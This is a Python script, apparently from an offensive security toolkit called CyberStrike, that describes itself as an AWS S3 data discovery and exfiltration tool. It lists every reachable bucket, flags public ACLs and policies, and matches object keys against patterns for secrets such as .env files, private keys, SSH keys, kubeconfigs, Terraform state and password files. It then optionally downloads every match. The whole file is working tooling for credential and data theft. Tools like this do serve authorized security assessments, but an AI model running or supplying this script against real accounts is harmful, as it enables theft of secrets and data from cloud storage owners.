#!/usr/bin/env python3
"""
s3_dump.py — AWS S3 Data Discovery and Exfiltration

Lists all S3 buckets, identifies sensitive files by pattern matching,
checks ACL/policy for public access, and optionally downloads matches.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import re
import signal
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import boto3
    from botocore.exceptions import ClientError, NoCredentialsError
except ImportError:
    print("ERROR: boto3 required. Install: pip3 install boto3", file=sys.stderr)
    sys.exit(1)

SENSITIVE_PATTERNS = [
    r"\.env$",
    r"\.pem$",
    r"\.key$",
    r"\.pfx$",
    r"\.p12$",
    r"credential",
    r"secret",
    r"password",
    r"\.tfstate$",
    r"\.tfvars$",
    r"backup.*\.(sql|tar|gz|zip|bak)$",
    r"config.*\.(json|yaml|yml|ini|cfg|toml)$",
    r"id_rsa",
    r"\.ssh/",
    r"kubeconfig",
    r"\.kube/config",
    r"docker-compose.*\.yml$",
    r"\.htpasswd$",
    r"wp-config\.php$",
    r"database\.(yml|json|ini)$",
]


def get_session(args):
    kwargs = {}
    if args.profile:
        kwargs["profile_name"] = args.profile
    if args.region:
        kwargs["region_name"] = args.region
    return boto3.Session(**kwargs)


class S3Dumper:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.patterns = [re.compile(p, re.IGNORECASE) for p in SENSITIVE_PATTERNS]
        if args.pattern:
            self.patterns.append(re.compile(args.pattern, re.IGNORECASE))

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — AWS S3 Data Dump")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Bucket:    {self.args.bucket or 'all'}")
        print(f"Download:  {self.args.download}")
        print(f"Max files: {self.args.max_files}")
        print(f"Profile:   {self.args.profile or 'default'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            rtype = record.get("type", "info")
            name = record.get("name", "")
            detail = record.get("detail", "")
            print(f"[{rtype.upper():<12}] {name:<50} {detail}", flush=True)

    def check_public_access(self, s3, bucket_name):
        public = False
        try:
            acl = s3.get_bucket_acl(Bucket=bucket_name)
            for grant in acl.get("Grants", []):
                grantee = grant.get("Grantee", {})
                uri = grantee.get("URI", "")
                if "AllUsers" in uri or "AuthenticatedUsers" in uri:
                    public = True
                    break
        except ClientError:
            pass

        try:
            policy = s3.get_bucket_policy(Bucket=bucket_name)
            policy_doc = json.loads(policy["Policy"])
            for stmt in policy_doc.get("Statement", []):
                if stmt.get("Effect") == "Allow" and stmt.get("Principal") in ["*", {"AWS": "*"}]:
                    public = True
                    break
        except ClientError:
            pass

        return public

    def match_key(self, key):
        for pattern in self.patterns:
            if pattern.search(key):
                return pattern.pattern
        return None

    def scan_bucket(self, s3, bucket_name, region):
        if not self.running:
            return

        public = self.check_public_access(s3, bucket_name)
        sensitive_files = []
        total_objects = 0
        files_downloaded = 0

        try:
            paginator = s3.get_paginator("list_objects_v2")
            for page in paginator.paginate(Bucket=bucket_name):
                if not self.running:
                    break
                for obj in page.get("Contents", []):
                    if not self.running:
                        break
                    total_objects += 1
                    key = obj["Key"]
                    matched = self.match_key(key)
                    if not matched:
                        continue

                    if self.args.max_files > 0 and len(sensitive_files) >= self.args.max_files:
                        break

                    file_record = {
                        "key": key,
                        "size": obj["Size"],
                        "last_modified": obj["LastModified"],
                        "matched_pattern": matched,
                    }
                    sensitive_files.append(file_record)

                    self.emit({
                        "type": "sensitive",
                        "name": f"s3://{bucket_name}/{key}",
                        "detail": f"size={obj['Size']} pattern={matched}",
                        "bucket": bucket_name,
                        **file_record,
                    })

                    if self.args.download:
                        output_dir = self.args.output_dir or f"/tmp/cs_s3_{bucket_name}"
                        local_path = os.path.join(output_dir, key)
                        os.makedirs(os.path.dirname(local_path), exist_ok=True)
                        try:
                            s3.download_file(bucket_name, key, local_path)
                            files_downloaded += 1
                            self.emit({"type": "download", "name": key, "detail": f"saved to {local_path}", "local_path": local_path})
                        except ClientError as e:
                            self.emit({"type": "download_error", "name": key, "detail": str(e)})
        except ClientError as e:
            self.emit({"type": "error", "name": bucket_name, "detail": f"list_objects failed: {e}"})

        self.emit({
            "type": "bucket",
            "name": bucket_name,
            "detail": f"objects={total_objects} sensitive={len(sensitive_files)} public={'YES' if public else 'no'} downloaded={files_downloaded}",
            "region": region,
            "total_objects": total_objects,
            "sensitive_count": len(sensitive_files),
            "public_access": public,
            "files_downloaded": files_downloaded,
        })

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        session = get_session(self.args)
        s3 = session.client("s3")

        if self.args.bucket:
            region = self.args.region or "us-east-1"
            self.scan_bucket(s3, self.args.bucket, region)
        else:
            try:
                buckets = s3.list_buckets().get("Buckets", [])
                self.emit({"type": "info", "name": "buckets", "detail": f"Found {len(buckets)} buckets"})
                for bucket in buckets:
                    if not self.running:
                        break
                    name = bucket["Name"]
                    try:
                        loc = s3.get_bucket_location(Bucket=name)
                        region = loc.get("LocationConstraint") or "us-east-1"
                    except ClientError:
                        region = "unknown"
                    self.scan_bucket(s3, name, region)
            except ClientError as e:
                self.emit({"type": "error", "name": "list_buckets", "detail": str(e)})

        self.cleanup()

    def cleanup(self):
        print(f"\n--- s3_dump summary ---")
        print(f"Total records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Discover and download sensitive files from AWS S3 buckets.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 s3_dump.py\n"
            "  python3 s3_dump.py --bucket my-bucket --download\n"
            "  python3 s3_dump.py --pattern '.*\\.sql$' --json-output\n"
        ),
    )
    parser.add_argument("--bucket", type=str, default=None, help="Specific bucket to scan")
    parser.add_argument("--download", action="store_true", default=False, help="Download matched files")
    parser.add_argument("--output-dir", type=str, default=None, help="Download directory")
    parser.add_argument("--pattern", type=str, default=None, help="Additional regex pattern to match")
    parser.add_argument("--max-files", type=int, default=100, help="Max sensitive files per bucket (default: 100)")
    parser.add_argument("--profile", type=str, default=None, help="AWS profile name")
    parser.add_argument("--region", type=str, default=None, help="AWS region")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    dumper = S3Dumper(args)
    dumper.run()


if __name__ == "__main__":
    main()
